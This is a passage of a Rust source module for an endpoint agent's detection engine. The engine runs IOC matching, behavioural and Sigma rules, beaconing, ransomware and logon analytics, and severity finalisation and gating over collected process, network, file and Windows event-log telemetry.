//! Local detection engine — behavioural + IOC analytics over the event stream.
//!
//! The engine sits in the main event consumer: every collected [`AgentEvent`]
//! is passed through [`DetectionEngine::inspect`], which returns zero or more
//! *new* detection events (class [`EventClass::Detection`]).  Those are fed
//! back into the same pipeline, so detections are persisted, shipped to the
//! backend and (optionally) acted on by the prevention engine like any other
//! event.
//!
//! Why in userspace, not eBPF: this analytics layer is **platform-neutral** by
//! design.  The Linux and Windows collectors emit the
//! same [`crate::schema`] events, so this engine — IOC matching, ATT&CK-mapped
//! behavioural heuristics, C2 beaconing — works unchanged on both. eBPF only
//! changes *how* the raw telemetry is gathered, not how it is judged.
//!
//! Sources covered today:
//!   * process exec/create  → [`behavior`] heuristics + IOC hash match
//!   * network connections  → IOC IP match + [`beaconing`] cadence analysis
//!   * DNS queries          → IOC domain match
//!
//! It never blocks the consumer: inspection is synchronous, allocation-light
//! and lock-scoped to the beacon tracker only.

pub mod accessor_correlation;
mod baseline;
mod beaconing;
mod behavior;
pub mod catalog;
mod dns_tunnel;
mod files;
pub mod gate;
#[cfg(target_os = "linux")] // fed only by the eBPF file-open gate
pub mod honeytoken;
pub mod honeytoken_policy;
mod ioa;
mod ioc;
mod netscan;
pub mod registry_rules;
pub mod replay;
pub mod severity;
pub mod sigma;
mod stateful;
#[cfg(any(windows, test))]
pub mod windows_decoy;
pub mod windows_evasion_rules;
pub mod windows_logon;
pub mod windows_rules;

#[cfg(feature = "yara")]
pub mod yara_scanner;

use std::sync::atomic::{AtomicBool, Ordering::Relaxed};
use std::sync::{Mutex, RwLock};
use std::time::Instant;

use tracing::{info, warn};

use crate::schema::{
    AgentEvent, CorrelationKeys, DetectionData, DetectionMode, EventAction, EventClass, EventData,
    PtraceData, RansomwareIndicatorData, SetuidData, Severity,
};

use ioa::ProcContext;

pub use ioc::IocSet;

/// Native Windows process audit records have no verified live generation.
/// Findings keep this source marker so admission and response stay fail-closed.
pub(crate) fn is_historical_windows_process_event(event: &AgentEvent) -> bool {
    matches!(
        event.origin.as_ref().and_then(|o| o.source.as_deref()),
        Some("windows_eventlog:Security:4688")
            | Some("windows_eventlog:Microsoft-Windows-Sysmon/Operational:1")
    )
}

/// Windows Event Log records are persisted audit evidence, including their
/// derived findings; their PIDs are not verified live process identities.
pub(crate) fn is_historical_windows_record(event: &AgentEvent) -> bool {
    event
        .origin
        .as_ref()
        .and_then(|o| o.source.as_deref())
        .is_some_and(|source| source.starts_with("windows_eventlog:"))
        || matches!(&event.data, EventData::Log(log) if windows_rules::eventlog_source(log).is_some())
}

/// Serial native pollers retry their last record when a durable checkpoint
/// fails. Keep exactly one UUID per raw source, without suppressing the
/// normalized events paired with it or unrelated telemetry.
#[derive(Default)]
pub(crate) struct CheckpointTracker {
    last: [Option<uuid::Uuid>; 5],
}

impl CheckpointTracker {
    pub(crate) fn is_retry(&mut self, event: &AgentEvent) -> bool {
        let source = event
            .origin
            .as_ref()
            .and_then(|origin| origin.source.as_deref());
        let slot = match (&event.data, source) {
            (EventData::Log(log), Some(source)) if log.source_type == "windows_eventlog" => {
                match (source, log.source_path.as_str()) {
                    ("windows_eventlog:Security", "Security") => 0,
                    ("windows_eventlog:System", "System") => 1,
                    ("windows_eventlog:Application", "Application") => 2,
                    (
                        "windows_eventlog:Microsoft-Windows-Sysmon/Operational",
                        "Microsoft-Windows-Sysmon/Operational",
                    ) => 3,
                    _ => return false,
                }
            }
            (EventData::Registry(_), Some("windows_registry_snapshot")) => 4,
            _ => return false,
        };
        if self.last[slot] == Some(event.event_id) {
            return true;
        }
        self.last[slot] = Some(event.event_id);
        false
    }
}

/// A mass write alone is a build, a `git checkout` or a sync client; it is
/// ransomware-like only together with encrypted-looking content, a ransom
/// extension or tampered backups seen this close in time (either order).
const RANSOM_CORROBORATION_SECS: f64 = 120.0;

#[derive(Default)]
struct RansomContext {
    last_mass_secs: Option<f64>,
    last_corroboration_secs: Option<f64>,
}

impl RansomContext {
    fn within(then: Option<f64>, now: f64) -> bool {
        then.is_some_and(|t| now >= t && now - t <= RANSOM_CORROBORATION_SECS)
    }
}

/// Native audit records use recorded UTC, independently of live elapsed time.
/// The Security cursor is ordered; late timestamps (including clock rollback)
/// remain telemetry but cannot change correlation history or complete a burst.
#[derive(Default)]
struct RecordedWindowsLogons {
    tracker: windows_logon::WindowsLogonTracker,
    last_timestamp: Option<chrono::DateTime<chrono::Utc>>,
}

impl RecordedWindowsLogons {
    fn observe(
        &mut self,
        logon: &crate::schema::UserLogonData,
        timestamp: chrono::DateTime<chrono::Utc>,
    ) -> Vec<DetectionData> {
        if self.last_timestamp.is_some_and(|last| timestamp < last) {
            return Vec::new();
        }
        self.last_timestamp = Some(timestamp);
        self.tracker
            .observe(logon, timestamp.timestamp_millis() as f64 / 1000.0)
    }
}

/// The detection engine.  Cheap to share behind an `Arc`; only the beacon
/// tracker is mutable (guarded by a `Mutex`).
pub struct DetectionEngine {
    agent_id: String,
    hostname: String,
    iocs: RwLock<IocSet>,
    beacons: Mutex<beaconing::BeaconTracker>,
    netscan: Mutex<netscan::NetScanTracker>,
    dns_tunnel: Mutex<dns_tunnel::DnsTunnelTracker>,
    /// Stateful attack-chain correlation over the process tree (IOA).
    ioa: Mutex<ioa::IoaEngine>,
    /// Compiled Sigma ruleset (disk baseline + backend-pushed), hot-swappable.
    sigma: RwLock<sigma::SigmaEngine>,
    sigma_enabled: std::sync::atomic::AtomicBool,
    /// Statistical behavioural baseline (process-lineage novelty + exec-rate).
    baseline: Mutex<baseline::BaselineEngine>,
    /// Runtime switch for the anomaly baseline (config `anomaly_detection_enabled`).
    anomaly_enabled: std::sync::atomic::AtomicBool,
    /// Multi-event single-host rules (recon bursts, brute force, chmod+exec).
    stateful: Mutex<stateful::StatefulRules>,
    recorded_windows_logons: Mutex<RecordedWindowsLogons>,
    analysis_checkpoints: Mutex<CheckpointTracker>,
    /// When filesystem ransomware indicators last fired, so a write burst is
    /// only an alert when something else corroborates it.
    ransom: Mutex<RansomContext>,
    /// Suppression + aggregation: the single exit for every finding.
    gate: Mutex<gate::FindingGate>,
    /// The agent's own pid: it and its children are never inspected.
    self_pid: i32,
    /// Telemetry-source latches. Once eBPF exec / connect / file events are
    /// flowing, the coarser `/proc`-polled and command-line duplicates of the
    /// same activity are no longer inspected.
    ebpf_exec_seen: AtomicBool,
    ebpf_connect_seen: AtomicBool,
    file_events_seen: AtomicBool,
    started: Instant,
    /// Seconds on the analytics clock of the event being inspected (`f64`
    /// bits). Live it tracks `started.elapsed()`; replay sets it from event
    /// timestamps. Read by the helpers that do not take the clock explicitly.
    clock_bits: std::sync::atomic::AtomicU64,
    /// Operator overrides of the catalog mode, per exact rule id (config
    /// `rule_modes`): promote a shadow rule, or silence a noisy one.
    rule_modes: RwLock<std::collections::HashMap<String, DetectionMode>>,
}

impl DetectionEngine {
    /// Build an engine, loading IOCs from `<config>/iocs.json` if present.
    pub fn new(agent_id: String, hostname: String) -> Self {
        let ioc_path = crate::paths::config_dir().join("iocs.json");
        let iocs = IocSet::load(&ioc_path);
        if iocs.is_empty() {
            info!(
                path = %ioc_path.display(),
                "Detection engine: no IOC feed loaded (place indicators there to enable IOC matching)"
            );
        } else {
            info!(path = %ioc_path.display(), count = iocs.len(), "Detection engine: IOC feed loaded");
        }
        Self {
            agent_id,
            hostname,
            iocs: RwLock::new(iocs),
            beacons: Mutex::new(beaconing::BeaconTracker::new()),
            netscan: Mutex::new(netscan::NetScanTracker::new()),
            dns_tunnel: Mutex::new(dns_tunnel::DnsTunnelTracker::new()),
            ioa: Mutex::new(ioa::IoaEngine::new()),
            sigma: RwLock::new(Self::load_sigma_from_disk()),
            sigma_enabled: std::sync::atomic::AtomicBool::new(true),
            baseline: Mutex::new(baseline::BaselineEngine::load(
                &crate::paths::state_dir().join("baseline.json"),
                Instant::now(),
            )),
            anomaly_enabled: std::sync::atomic::AtomicBool::new(true),
            stateful: Mutex::new(stateful::StatefulRules::new()),
            recorded_windows_logons: Mutex::new(RecordedWindowsLogons::default()),
            analysis_checkpoints: Mutex::new(CheckpointTracker::default()),
            ransom: Mutex::new(RansomContext::default()),
            gate: Mutex::new(gate::FindingGate::new()),
            self_pid: std::process::id() as i32,
            ebpf_exec_seen: AtomicBool::new(false),
            ebpf_connect_seen: AtomicBool::new(false),
            file_events_seen: AtomicBool::new(false),
            started: Instant::now(),
            clock_bits: std::sync::atomic::AtomicU64::new(0),
            rule_modes: RwLock::new(std::collections::HashMap::new()),
        }
    }

    /// Persist the learned baseline so a restart does not re-alert on binaries
    /// the user has run for weeks. Best-effort.
    pub fn persist_baseline(&self) {
        if let Ok(b) = self.baseline.lock() {
            let path = crate::paths::state_dir().join("baseline.json");
            if let Err(e) = b.save(&path) {
                warn!(error = %e, "could not persist detection baseline");
            }
        }
    }

    /// Replace the operator-defined suppressions (from the signed config).
    pub fn set_suppressions(&self, rules: Vec<gate::SuppressionRule>) {
        if let Ok(mut g) = self.gate.lock() {
            if !rules.is_empty() {
                info!(count = rules.len(), "Detection engine: suppressions loaded");
            }
            g.set_suppressions(rules);
        }
    }

    /// Replace the rule mode overrides (from the signed config).
    pub fn set_rule_modes(&self, overrides: &[crate::config::RuleModeOverride]) {
        if let Ok(mut m) = self.rule_modes.write() {
            *m = overrides.iter().map(|o| (o.rule.clone(), o.mode)).collect();
        }
    }

    /// The effective mode of a rule: operator override, else catalog.
    fn effective_mode(&self, rule_id: &str, catalog: DetectionMode) -> DetectionMode {
        self.rule_modes
            .read()
            .ok()
            .and_then(|m| m.get(rule_id).copied())
            .unwrap_or(catalog)
    }

    /// Toggle the statistical anomaly baseline at runtime (config-driven).
    pub fn set_anomaly_enabled(&self, on: bool) {
        self.anomaly_enabled
            .store(on, std::sync::atomic::Ordering::Relaxed);
    }

    pub fn set_sigma_enabled(&self, on: bool) {
        self.sigma_enabled
            .store(on, std::sync::atomic::Ordering::Relaxed);
    }

    /// Number of loaded IOCs (diagnostics / tests).
    pub fn ioc_count(&self) -> usize {
        self.iocs.read().map(|i| i.len()).unwrap_or(0)
    }

    /// Number of compiled Sigma rules currently loaded (diagnostics / tests).
    pub fn sigma_count(&self) -> usize {
        self.sigma.read().map(|s| s.len()).unwrap_or(0)
    }

    /// Compile the disk-resident Sigma baseline from `<config>/sigma/`.
    fn load_sigma_from_disk() -> sigma::SigmaEngine {
        let dir = crate::paths::config_dir().join("sigma");
        let engine = sigma::SigmaEngine::from_dir(&dir);
        if !engine.is_empty() {
            info!(dir = %dir.display(), rules = engine.len(), "Sigma: disk baseline loaded");
        }
        engine
    }

    /// Recompile the Sigma ruleset = disk baseline + backend-pushed inline
    /// rules. Called when a freshly-verified `AgentConfig` is applied, so the
    /// backend can ship detections over the signed config channel without a
    /// restart. Bad rules are reported but never disable the engine.
    pub fn reload_sigma(&self, backend_docs: &[String]) {
        let mut engine = Self::load_sigma_from_disk();
        if !backend_docs.is_empty() {
            let (dynamic, errors) = sigma::SigmaEngine::from_yaml_docs(backend_docs);
            for e in &errors {
                warn!(error = %e, "Sigma: skipping invalid backend rule");
            }
            let added = dynamic.len();
            engine.extend(dynamic);
            info!(
                backend_rules = added,
                total = engine.len(),
                "Sigma: ruleset reloaded from config"
            );
        }
        match self.sigma.write() {
            Ok(mut g) => *g = engine,
            Err(e) => warn!("Sigma: lock poisoned on reload: {e}"),
        }
    }

    /// Reload the IOC feed from `<config>/iocs.json`.  Called periodically so a
    /// threat-intel sync that rewrites the file takes effect without a restart.
    pub fn reload_iocs(&self) {
        let path = crate::paths::config_dir().join("iocs.json");
        if !path.exists() {
            return;
        }
        let fresh = IocSet::load(&path);
        match self.iocs.write() {
            Ok(mut guard) => {
                if fresh.len() != guard.len() {
                    info!(count = fresh.len(), "Detection engine: IOC feed reloaded");
                }
                *guard = fresh;
            }
            Err(e) => warn!("Detection engine: IOC lock poisoned on reload: {e}"),
        }
    }

    /// Spawn a background task that reloads the IOC feed every `secs` seconds.
    pub fn spawn_ioc_reloader(self: std::sync::Arc<Self>, secs: u64) {
        tokio::spawn(async move {
            let mut ticker = tokio::time::interval(std::time::Duration::from_secs(secs.max(30)));
            loop {
                ticker.tick().await;
                self.reload_iocs();
            }
        });
    }

    /// Inspect one event, returning the findings it triggers — enriched with
    /// correlation keys and severity-finalised, but not yet gated: callers pass
    /// them through [`Self::admit`] before emitting them.
    ///
    /// Detections we raise ourselves are skipped to avoid feedback loops, and
    /// so is everything the agent process (or a child it spawned) does.
    pub fn inspect(&self, event: &AgentEvent) -> Vec<AgentEvent> {
        self.inspect_at(event, Instant::now(), self.started.elapsed().as_secs_f64())
    }

    /// [`Self::inspect`] with an injected clock: `now` drives every windowed
    /// analytic and `elapsed_secs` the stateful single-host rules. Replay uses
    /// it to evaluate recorded telemetry on its original timeline instead of
    /// compressing hours of activity into one instant (which would inflate
    /// every rate- and burst-based rule).
    pub fn inspect_at(
        &self,
        event: &AgentEvent,
        now: Instant,
        elapsed_secs: f64,
    ) -> Vec<AgentEvent> {
        if matches!(event.class, EventClass::Detection) {
            return Vec::new();
        }
        if self
            .analysis_checkpoints
            .lock()
            .map(|mut checkpoints| checkpoints.is_retry(event))
            .unwrap_or(false)
        {
            return Vec::new();
        }
        self.clock_bits.store(elapsed_secs.to_bits(), Relaxed);

        // Stateful IOA correlation runs first: it keeps the process tree
        // current (so this event's own process resolves), yields the acting
        // process's context, and emits any attack chains that just completed.
        let historical_process = is_historical_windows_process_event(event)
            && matches!(event.data, EventData::ProcessCreate(_));
        let (ioa, ctx, own) = if historical_process {
            // Audit timestamps and PIDs describe an earlier process, not the
            // currently running generation. Never update or query live IOA.
            (ioa::IoaResult::default(), None, false)
        } else {
            match self.ioa.lock() {
                Ok(mut e) => {
                    let res = e.observe(event, now);
                    let own = res
                        .pid
                        .is_some_and(|p| p == self.self_pid || e.descends_from(self.self_pid, p));
                    let ctx = res.pid.and_then(|p| e.context(p));
                    (res, ctx, own)
                }
                Err(_) => (ioa::IoaResult::default(), None, false),
            }
        };
        if own {
            return Vec::new();
        }
        let ctx = ctx.as_ref();

        let mut out = Vec::new();
        match &event.data {
            EventData::ProcessCreate(p) => {
                // With eBPF exec telemetry every process also arrives as a
                // ProcessExec; inspecting the /proc-polled copy too would
                // duplicate every process finding.
                if historical_process {
                    self.inspect_process_rules(
                        &p.name,
                        &p.exe,
                        &p.cmdline,
                        p.exe_sha256.as_deref(),
                        None,
                        &mut out,
                    );
                } else if !self.ebpf_exec_seen.load(Relaxed) {
                    self.inspect_process(
                        &p.name,
                        &p.exe,
                        &p.cmdline,
                        p.exe_sha256.as_deref(),
                        ctx,
                        &mut out,
                    );
                }
            }
            EventData::ProcessExec(p) => {
                self.ebpf_exec_seen.store(true, Relaxed);
                self.inspect_process(
                    &p.comm,
                    &p.exe,
                    &p.cmdline,
                    p.exe_sha256.as_deref(),
                    ctx,
                    &mut out,
                );
                if let Some(ref ld_preload) = p.ld_preload {
                    if let Some(d) = behavior::inspect_ld_preload(&p.comm, &p.exe, ld_preload) {
                        out.push(self.detection(Severity::Info, d));
                    }
                }
            }
            EventData::Setuid(s) => {
                self.inspect_setuid(s, &mut out);
            }
            EventData::NetworkConnection(n) => {
                // Flow-start records only (the poller also emits a `closed`
                // record per flow), and only while no eBPF connect telemetry
                // reports the same connections.
                if n.state != "closed" && !self.ebpf_connect_seen.load(Relaxed) {
                    self.inspect_network(&n.dst_addr, n.dst_port, elapsed_secs, ctx, &mut out);
                }
            }
            EventData::NetworkSocket(n) => match n.op.as_str() {
                "connect" => {
                    self.ebpf_connect_seen.store(true, Relaxed);
                    self.inspect_network(&n.addr, n.port, elapsed_secs, ctx, &mut out);
                }
                // An inbound peer is only an IOC question; cadence and scan
                // analytics are about where *we* connect to.
                "accept" => self.inspect_ioc_ip(&n.addr, n.port, &mut out),
                _ => {}
            },
            // `DnsData` carries only the resolver address. Domain analytics
            // run on the resolved name from `DnsResolution`.
            EventData::DnsResolution(r) => {
                self.inspect_domain(&r.qname, elapsed_secs, &mut out);
            }
            EventData::FileOpen(f) => {
                self.file_events_seen.store(true, Relaxed);
                if files::is_write_open(f.flags) {
                    self.inspect_file_write(&f.path, &f.comm, ctx, &mut out);
                }
                self.inspect_file_open(&f.path, &f.comm, &mut out);
            }
            EventData::FileRename(r) => {
                self.file_events_seen.store(true, Relaxed);
                self.inspect_file_write(&r.new_path, &r.comm, ctx, &mut out);
            }
            EventData::FileChmod(c) => {
                if c.mode & 0o111 != 0 && is_temp_path(&c.path) {
                    if let Ok(mut st) = self.stateful.lock() {
                        st.observe_chmod_exec(&c.path, elapsed_secs);
                    }
                }
            }
            EventData::Ptrace(p) => {
                self.inspect_ptrace(p, &mut out);
            }
            EventData::RansomwareIndicator(r) => {
                self.inspect_ransomware(r, &mut out);
            }
            // Windows logons (normalised, carry a logon type) have their own
            // account- and source-keyed tracker; the SSH one is source-only.
            EventData::UserLogon(l) if is_historical_windows_record(event) => {
                let hits = self
                    .recorded_windows_logons
                    .lock()
                    .map(|mut tracker| tracker.observe(l, event.timestamp))
                    .unwrap_or_default();
                for d in hits {
                    out.push(self.detection(Severity::Info, d));
                }
            }
            EventData::UserLogon(l) if l.logon_type.is_some() => {
                let hits = self
                    .stateful
                    .lock()
                    .map(|mut st| st.observe_windows_logon(l, elapsed_secs))
                    .unwrap_or_default();
                for d in hits {
                    out.push(self.detection(Severity::Info, d));
                }
            }
            EventData::UserLogon(l) => {
                let src = l.src_addr.as_deref().unwrap_or("");
                let hit =
                    self.stateful.lock().ok().and_then(|mut st| {
                        st.observe_logon(&l.username, src, l.success, elapsed_secs)
                    });
                if let Some(d) = hit {
                    out.push(self.detection(Severity::Info, d));
                }
            }
            EventData::Registry(r) => {
                for d in registry_rules::inspect_registry(r) {
                    out.push(self.detection(Severity::Info, d));
                }
            }
            EventData::Log(l) => {
                // Service / scheduled-task creation (7045, 4697, 4698).
                for d in registry_rules::inspect_eventlog(l) {
                    out.push(self.detection(Severity::Info, d));
                }
                // Log records feed the same engine: a sudo COMMAND is an
                // exec-equivalent, a remote_addr/src_addr is a network IOC.
                if let Some(cmd) = l.fields.get("command").and_then(|v| v.as_str()) {
                    self.inspect_process(
                        l.proc.as_deref().unwrap_or("unknown"),
                        "",
                        cmd,
                        None,
                        None,
                        &mut out,
                    );
                }
                // Windows 4688 (process creation): the command line the ETW
                // sensor could not read before a short-lived process exited.
                // Repeats of a command ETW did capture fold in the gate.
                if l.fields.get("EventID").and_then(|v| v.as_u64()) == Some(4688)
                    && windows_rules::eventlog_source(l).is_some()
                {
                    let text = |k: &str| l.fields.get(k).and_then(|v| v.as_str()).unwrap_or("");
                    let (exe, cmd) = (text("NewProcessName"), text("CommandLine"));
                    if !cmd.is_empty() {
                        let name = exe.rsplit(['\\', '/']).next().unwrap_or(exe);
                        self.inspect_process_rules(name, exe, cmd, None, None, &mut out);
                    }
                }
                let ip = l
                    .fields
                    .get("src_addr")
                    .or_else(|| l.fields.get("remote_addr"))
                    .and_then(|v| v.as_str());
                if let Some(ip) = ip {
                    let port = l
                        .fields
                        .get("src_port")
                        .or_else(|| l.fields.get("destinationport"))
                        .and_then(|v| v.as_u64())
                        .unwrap_or(0) as u16;
                    self.inspect_ioc_ip(ip, port, &mut out);
                }
            }
            _ => {}
        }

        // Sigma: evaluate the compiled ruleset against this event's field
        // projection. Skipped cheaply when no rules are loaded or the event type
        // carries no Sigma mapping.
        if self
            .sigma_enabled
            .load(std::sync::atomic::Ordering::Relaxed)
            && self.sigma.read().map(|s| !s.is_empty()).unwrap_or(false)
        {
            if let Some(view) = sigma::fields::FieldView::from_event(event) {
                if let Ok(engine) = self.sigma.read() {
                    for rule in engine.evaluate(&view) {
                        out.push(self.detection(rule.level, sigma_detection(rule, &view)));
                    }
                }
            }
        }

        // Enrich the per-event findings with the actor's process lineage, then
        // add the attack chains that just completed.
        if let Some(lineage) = ioa
            .lineage
            .as_ref()
            .filter(|_| !is_historical_windows_record(event))
        {
            for ev in out.iter_mut() {
                if let EventData::Detection(d) = &mut ev.data {
                    inject_lineage(&mut d.evidence, lineage);
                }
            }
        }
        for data in ioa.findings {
            out.push(self.detection(Severity::Info, data));
        }

        for ev in out.iter_mut() {
            if is_historical_windows_record(event) {
                // Preserve the audit provenance on findings: external
                // admission and response must not rebind an archived PID.
                ev.timestamp = match &event.data {
                    EventData::Log(log) => log.log_timestamp.unwrap_or(event.timestamp),
                    _ => event.timestamp,
                };
                if let Some(finding_origin) = &mut ev.origin {
                    finding_origin.source = event
                        .origin
                        .as_ref()
                        .and_then(|origin| origin.source.as_ref())
                        .filter(|source| source.starts_with("windows_eventlog:"))
                        .cloned()
                        .or_else(|| match &event.data {
                            EventData::Log(log) => windows_rules::eventlog_source(log),
                            _ => None,
                        });
                }
            }
            self.finalize(ev, Some(event), ctx);
        }
        // Inspect deterministic evidence first. A suspicious execution cannot
        // authorize its own admission to the learned normal baseline.
        if !historical_process && self.anomaly_enabled.load(Relaxed) {
            let actor = match &event.data {
                EventData::ProcessExec(p) => Some((&p.username, &p.exe)),
                EventData::ProcessCreate(p) if !self.ebpf_exec_seen.load(Relaxed) => {
                    Some((&p.username, &p.exe))
                }
                _ => None,
            };
            if let Some((user, exe)) = actor {
                let eligible = out
                    .iter()
                    .all(|e| !matches!(&e.data, EventData::Detection(d) if d.confidence >= 50));
                if let Ok(mut baseline) = self.baseline.lock() {
                    if let Some(d) = baseline.observe_exec_at(
                        user,
                        exe,
                        now,
                        event.timestamp.timestamp().max(0) as u64,
                        eligible,
                    ) {
                        let mut finding = self.detection(Severity::Info, d);
                        self.finalize(&mut finding, Some(event), ctx);
                        out.push(finding);
                    }
                }
            }
        }
        out
    }

    /// Pass findings through the gate (suppression + aggregation). Only what
    /// this returns may be emitted.
    pub fn admit(&self, findings: Vec<AgentEvent>) -> Vec<gate::Emitted> {
        self.admit_at(findings, Instant::now())
    }

    /// [`Self::admit`] with an injected clock (replay).
    pub fn admit_at(&self, findings: Vec<AgentEvent>, now: Instant) -> Vec<gate::Emitted> {
        if findings.is_empty() {
            return Vec::new();
        }
        match self.gate.lock() {
            Ok(mut g) => findings.into_iter().flat_map(|f| g.admit(f, now)).collect(),
            Err(e) => {
                warn!("Detection gate lock poisoned: {e}");
                findings
                    .into_iter()
                    .map(|event| gate::Emitted {
                        event,
                        aggregate: false,
                    })
                    .collect()
            }
        }
    }

    /// Admit a detection a collector raised directly (memory scan, rootkit,
    /// filesystem, honeytokens): enrich it from the process tree, finalise its
    /// severity and gate it like an engine finding.
    pub fn admit_external(&self, event: AgentEvent) -> Vec<gate::Emitted> {
        self.admit_external_at(event, Instant::now())
    }

    pub fn admit_external_at(&self, mut event: AgentEvent, now: Instant) -> Vec<gate::Emitted> {
        if let EventData::HoneytokenAccess(data) = &mut event.data {
            let outcome = honeytoken_policy::assess(data, event.severity);
            event.severity = outcome.severity;
            data.mode = Some(outcome.mode);
            if matches!(
                data.access_kind.as_str(),
                "modify" | "unlink" | "rename" | "hardlink" | "exec"
            ) {
                data.confidence = data.confidence.max(90);
            }
            data.assessment_reasons = outcome.reasons;
            // Raw accesses remain individual forensic evidence. Backend folds alerts.
            return self.admit_at(vec![event], now);
        }
        if let EventData::Detection(d) = &event.data {
            let pid = d
                .evidence
                .get("pid")
                .or_else(|| d.evidence.get("accessor_pid"))
                .and_then(|v| v.as_i64())
                .map(|p| p as i32)
                .or_else(|| d.correlation.as_ref().and_then(|c| c.pid));
            let (ctx, own, lineage) = if is_historical_windows_record(&event) {
                (None, false, None)
            } else {
                match (pid, self.ioa.lock()) {
                    (Some(pid), Ok(e)) => (
                        e.context(pid),
                        pid == self.self_pid || e.descends_from(self.self_pid, pid),
                        e.lineage(pid),
                    ),
                    _ => (None, false, None),
                }
            };
            if own {
                return Vec::new();
            }
            if let (EventData::Detection(d), Some(lineage)) = (&mut event.data, &lineage) {
                if d.evidence.get("process_lineage").is_none() {
                    inject_lineage(&mut d.evidence, lineage);
                }
            }
            self.finalize(&mut event, None, ctx.as_ref());
        }
        self.admit_at(vec![event], now)
    }

    /// Aggregate updates that are due (or everything pending, on shutdown).
    pub fn flush_findings(&self, force: bool) -> Vec<gate::Emitted> {
        self.flush_findings_at(Instant::now(), force)
    }

    /// [`Self::flush_findings`] with an injected clock (replay).
    pub fn flush_findings_at(&self, now: Instant, force: bool) -> Vec<gate::Emitted> {
        self.gate
            .lock()
            .map(|mut g| g.flush(now, force))
            .unwrap_or_default()
    }

    /// Stamp a finding with correlation keys, catalog metadata, the severity
    /// policy's verdict and its dedup key.
    fn finalize(
        &self,
        ev: &mut AgentEvent,
        trigger: Option<&AgentEvent>,
        ctx: Option<&ProcContext>,
    ) {
        let ctx = if is_historical_windows_record(ev)
            || trigger.is_some_and(is_historical_windows_record)
        {
            None
        } else {
            ctx
        };
        let emitted_severity = ev.severity;
        let EventData::Detection(d) = &mut ev.data else {
            return;
        };
        if !catalog::is_known(&d.rule_id) {
            crate::telemetry::metrics::metrics().detection_uncatalogued();
        }
        let meta = catalog::lookup(&d.rule_id);
        if d.mitre_tactic.is_none() && !meta.tactic.is_empty() {
            d.mitre_tactic = Some(meta.tactic.into());
        }
        if d.mitre_technique.is_none() && !meta.technique.is_empty() {
            d.mitre_technique = Some(meta.technique.into());
        }

        // Correlation: what the rule set itself wins, then the process tree,
        // then the triggering event, then the structured evidence.
        let mut c = d.correlation.take().unwrap_or_default();
        if let Some(ctx) = ctx {
            fill(&mut c.process_key, Some(ctx.process_key.clone()));
            fill(&mut c.parent_key, ctx.parent_key.clone());
            fill(&mut c.root_key, ctx.root_key.clone());
            fill(&mut c.pid, Some(ctx.pid));
            fill(
                &mut c.user,
                Some(ctx.username.clone()).filter(|u| !u.is_empty()),
            );
            fill(&mut c.exe, Some(ctx.exe.clone()).filter(|e| !e.is_empty()));
            fill(&mut c.exe_sha256, ctx.exe_hash.clone());
            fill(&mut c.container_id, ctx.container_id.clone());
            if c.lineage_keys.is_empty() {
                c.lineage_keys = ctx.lineage_keys.clone();
            }
        }
        if let Some(t) = trigger {
            entities_from_event(t, &mut c);
        }
        entities_from_evidence(&d.evidence, &mut c);
        d.correlation = Some(c);

        // Severity: the rule's own base (when it set one) or the catalog's;
        // families that carry their own severity keep the emitted one.
        let base = d.base_severity.unwrap_or(if meta.base_from_event {
            emitted_severity
        } else {
            meta.base
        });
        let base = base.min(meta.max);
        let mut flags: Vec<String> = ctx
            .map(|c| c.flags.iter().map(|f| f.to_string()).collect())
            .unwrap_or_default();
        for f in d.context_flags.drain(..) {
            if !flags.contains(&f) {
                flags.push(f);
            }
        }
        let mut input = severity::PolicyInput::from_meta(&meta, base, d.confidence, flags.clone());
        let configured = self.effective_mode(&d.rule_id, meta.mode);
        input.mode = if configured == DetectionMode::Shadow {
            // Severity is still evaluated (it is what the finding *would* be).
            DetectionMode::Alert
        } else {
            configured
        };
        if let Some(mode) = d.mode {
            // A rule may demote itself to a signal; it can never promote a
            // catalog signal to an alert.
            if input.mode == DetectionMode::Alert && mode == DetectionMode::Signal {
                input.mode = mode;
            }
        }
        let outcome = severity::evaluate(&input);
        d.mode = Some(if configured == DetectionMode::Shadow {
            DetectionMode::Shadow
        } else {
            outcome.mode
        });
        d.base_severity = Some(base);
        d.severity_reasons = outcome.reasons;
        d.context_flags = flags;
        ev.severity = outcome.severity;
        d.dedup_key = Some(dedup_key(&meta, d));
    }

    // ── Per-source inspectors ────────────────────────────────────────────────

    fn inspect_process(
        &self,
        comm: &str,
        exe: &str,
        cmdline: &str,
        exe_hash: Option<&str>,
        ctx: Option<&ProcContext>,
        out: &mut Vec<AgentEvent>,
    ) {
        self.inspect_process_rules(comm, exe, cmdline, exe_hash, ctx, out);

        // Session-level stateful rules.
        let base = comm.rsplit('/').next().unwrap_or(comm);
        let session = ctx.and_then(|c| c.root_key.clone().or_else(|| c.parent_key.clone()));
        let now = self.clock();
        if let Ok(mut st) = self.stateful.lock() {
            if let Some(session) = &session {
                if let Some(d) = st.observe_exec_recon(session, base, cmdline, now) {
                    out.push(self.detection(Severity::Info, d));
                }
                if base == "systemctl" {
                    if let Some(d) = st.observe_systemctl(session, cmdline, now) {
                        out.push(self.detection(Severity::Info, d));
                    }
                }
            }
            if is_temp_path(exe) {
                if let Some(d) = st.observe_temp_exec(exe, now) {
                    out.push(self.detection(Severity::Info, d));
                }
            }
        }
    }

    fn inspect_process_rules(
        &self,
        comm: &str,
        exe: &str,
        cmdline: &str,
        exe_hash: Option<&str>,
        ctx: Option<&ProcContext>,
        out: &mut Vec<AgentEvent>,
    ) {
        // IOC: known-bad executable hash.
        if let Some(h) = exe_hash {
            let hit = self.iocs.read().map(|i| i.match_hash(h)).unwrap_or(false);
            if hit {
                out.push(self.detection(
                    Severity::Critical,
                    DetectionData {
                        rule_id: "ioc.process_hash".into(),
                        title: "Process matches known-bad hash".into(),
                        category: "ioc".into(),
                        mitre_tactic: Some("TA0002 Execution".into()),
                        mitre_technique: Some("T1204".into()),
                        confidence: 95,
                        subject: exe.to_string(),
                        detail: format!("Executable {exe} matches threat-intel hash {h}"),
                        evidence: serde_json::json!({ "hash": h, "comm": comm }),
                        correlation: Some(CorrelationKeys {
                            exe_sha256: Some(h.to_string()),
                            ..Default::default()
                        }),
                        ..Default::default()
                    },
                ));
            }
        }

        // Behavioural heuristics. Once file telemetry is flowing, the file
        // rules see persistence writes precisely (real path, real writer), so
        // the command-line guesses for the same rules are dropped.
        let file_events = self.file_events_seen.load(Relaxed);
        if let Some(d) = behavior::inspect_process_with(comm, exe, cmdline, ctx) {
            if !(file_events && files::FILE_COVERED_RULES.contains(&d.rule_id.as_str())) {
                self.note_unit_write(&d, ctx);
                out.push(self.detection(Severity::Info, d));
            }
        }
